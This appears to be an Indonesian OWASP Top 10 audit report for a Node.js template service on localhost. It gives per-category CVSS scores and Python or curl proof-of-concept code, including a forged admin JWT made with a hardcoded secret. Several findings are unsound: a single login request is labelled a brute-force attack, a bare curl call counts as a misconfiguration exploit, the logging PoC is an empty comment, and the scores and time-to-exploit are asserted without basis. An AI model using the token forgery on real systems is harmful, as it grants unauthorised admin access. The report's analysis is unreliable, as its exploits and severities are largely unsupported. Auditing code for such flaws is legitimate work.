## A01 - Broken Access Control: FOUND
Lokasi spesifik di kode: `app.get('/template', async (req, res) => {...})`
CVSS score: 8.0
PoC exploit code:
```python
import requests

# Tanpa autentikasi, kita bisa mengakses endpoint /template
response = requests.get('http://localhost:3000/template')
print(response.json())
```
Dampak nyata jika dieksploitasi: Penyerang dapat mengakses data template tanpa autentikasi, sehingga dapat membocorkan informasi sensitif.

## A02 - Cryptographic Failures: FOUND
Lokasi spesifik di kode: `const token = jwt.sign(req.body, 'secretkey', { expiresIn: '1h' });`
CVSS score: 9.0
PoC exploit code:
```python
import jwt

# Kita dapat membobol token JWT dengan menggunakan secret key yang hardcoded
secret_key = 'secretkey'
token = jwt.encode({'username': 'admin'}, secret_key, algorithm='HS256')
print(token)
```
Dampak nyata jika dieksploitasi: Penyerang dapat membobol token JWT dan mengakses sistem dengan hak akses administrator.

## A03 - Injection: NOT FOUND

## A04 - Insecure Design: FOUND
Lokasi spesifik di kode: `app.post('/template', async (req, res) => {...})`
CVSS score: 6.0
PoC exploit code:
```python
import requests

# Kita dapat membuat template dengan nama yang sama, sehingga dapat menimpa template yang sudah ada
response = requests.post('http://localhost:3000/template', json={'name': 'template1', 'description': 'deskripsi'})
print(response.json())
```
Dampak nyata jika dieksploitasi: Penyerang dapat membuat template dengan nama yang sama, sehingga dapat menimpa template yang sudah ada dan menyebabkan kekacauan.

## A05 - Security Misconfiguration: FOUND
Lokasi spesifik di kode: `app.listen(3000, () => {...})`
CVSS score: 7.0
PoC exploit code:
```bash
# Kita dapat mengakses aplikasi dengan menggunakan URL yang tidak aman
curl http://localhost:3000
```
Dampak nyata jika dieksploitasi: Penyerang dapat mengakses aplikasi dengan menggunakan URL yang tidak aman, sehingga dapat membocorkan informasi sensitif.

## A06 - Vulnerable Components: NOT FOUND

## A07 - Auth & Session Failures: FOUND
Lokasi spesifik di kode: `app.post('/auth', (req, res) => {...})`
CVSS score: 8.0
PoC exploit code:
```python
import requests

# Kita dapat melakukan brute force attack pada endpoint /auth
response = requests.post('http://localhost:3000/auth', json={'username': 'admin', 'password': 'password'})
print(response.json())
```
Dampak nyata jika dieksploitasi: Penyerang dapat melakukan brute force attack pada endpoint /auth dan mengakses sistem dengan hak akses administrator.

## A08 - Software Integrity Fails: NOT FOUND

## A09 - Logging & Monitoring Fail: FOUND
Lokasi spesifik di kode: Tidak ada logging yang jelas
CVSS score: 5.0
PoC exploit code:
```bash
# Kita tidak dapat melihat log aplikasi dengan jelas
```
Dampak nyata jika dieksploitasi: Penyerang dapat melakukan serangan tanpa diketahui, karena tidak ada logging yang jelas.

## A10 - SSRF: NOT FOUND

## RINGKASAN:
- Kerentanan ditemukan: 6/10 kategori OWASP
- CVSS tertinggi: 9.0 - A02 Cryptographic Failures
- Attack vector paling efektif: Brute force attack pada endpoint /auth
- Estimated time-to-exploit: 1 jam